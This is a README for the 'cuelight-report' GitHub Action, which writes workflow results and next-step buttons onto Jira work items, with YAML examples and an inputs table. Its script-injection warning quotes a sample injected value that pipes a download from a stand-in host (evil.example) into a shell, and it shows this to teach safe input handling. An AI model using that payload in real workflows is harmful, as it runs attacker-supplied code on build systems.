# Cuelight report: GitHub Actions results and next steps on Jira tickets

**Your workflow just finished. What's next?**

This action writes a GitHub Actions run's result back to the Jira work item that started it, and
hands over the next step as a button on that work item: Promote to production after a staging
deploy, Roll back after a failed smoke test, Deploy preview after a pull request opens.

```
Jira ticket SHOP-142                        Next steps
  ✔ Deploy to staging passed · View run     [ Promote to production ]  release managers
                                            [ Roll back staging ]      developers
```

It's the reporting half of [Cuelight for Jira](https://cuelight.netlify.app), a Jira Cloud app that
puts buttons on work items to run GitHub Actions workflows. Developers own the workflows; QA,
product managers and release managers run them from Jira, and Jira groups decide who can press
what. Nobody needs GitHub access to press a button.

- [See the loop in the demo](https://cuelight.netlify.app/demo)
- [Build an action and its workflow YAML](https://cuelight.netlify.app/builder)
- [Get Cuelight on the Atlassian Marketplace](https://marketplace.atlassian.com/apps/4069113941)
  (free for up to 10 users)

## Report a run started by Cuelight

The workflow must declare the two inputs Cuelight sends:

```yaml
on:
  workflow_dispatch:
    inputs:
      issue_key: { type: string, required: true }
      cuelight_callback_url: { type: string, required: false }
      cuelight_token: { type: string, required: false }

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: huseyinbuyukdere/cuelight-report@v1
        with:
          status: running
      # ... your steps ...
      - name: Hand back the next step
        if: always()
        uses: huseyinbuyukdere/cuelight-report@v1
        with:
          status: ${{ job.status }}
          message: Deployed ${{ github.sha }}
          next: rollback-staging, promote-production
```

The callback URL and the run token come from the workflow inputs automatically. The token is
valid for 24 hours and only for this run; a second final report gets `409`.

## Offer a next step

```yaml
- uses: huseyinbuyukdere/cuelight-report@v1
  env:
    CUELIGHT_REPORT_URL: ${{ secrets.CUELIGHT_REPORT_URL }}
  with:
    install-key: ${{ secrets.CUELIGHT_INSTALL_KEY }}
    issue-key: SHOP-1
    source: 'PR #${{ github.event.pull_request.number }}'
    next: '[{"action":"deploy-preview","inputs":{"pr":"${{ github.event.pull_request.number }}"}}]'
```

The report URL and the install key are on the Reporting tab of the Cuelight settings in Jira.
Keep the key in a secret; never paste it into a workflow file.

## Inputs

| Input | Use |
|---|---|
| `status` | `running`, `success`, `failure` or `cancelled`. Usually `${{ job.status }}`. Not used for offers. |
| `message` | Plain text shown on the work item, at most 500 characters. |
| `next` | Comma-separated action ids, or a JSON array like `[{"action":"deploy","inputs":{"pr":"12"}}]`. |
| `url` | "View run" link. Must start with `https://github.com/`. Defaults to this workflow run. |
| `install-key` | Sends an offer instead of a run report. |
| `issue-key` | Work item key, required for offers. |
| `source` | Offer label, shown as "Suggested by …" (at most 60 characters). |
| `expires-in-hours` | How long the next steps stay (1–720, default 168). |
| `fail-on-error` | Fail the step when the report can't be delivered (default `false`, which logs a warning). |

Output: `http-status`, the HTTP status Cuelight returned.

## Warning: script injection

Inputs that Cuelight passes to your workflow (`issue_key`, form values like `reason`) are typed by
people. Never put them straight into a `run:` script with `${{ inputs.reason }}`; a value like
`"; curl evil.example | sh; "` would run as code. Pass them through `env:` and quote the variable:

```yaml
- name: Deploy
  env:
    REASON: ${{ inputs.reason }}
  run: ./deploy.sh --reason "$REASON"
```

Cuelight strips control characters and limits lengths, but it can't know how your script uses a
value. See GitHub's
[security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).

## Learn more

- [Report API](https://cuelight.netlify.app/docs/report-api): the HTTP calls behind this action, for
  tools other than GitHub Actions
- [Workflow patterns](https://cuelight.netlify.app/docs/workflow-patterns): deploy, promote and roll
  back; approve after an AI agent's pull request
- [Why Cuelight](https://cuelight.netlify.app/why): compared with Jira Automation web requests and
  other options
- Support: huseyinbuyukdere95@gmail.com
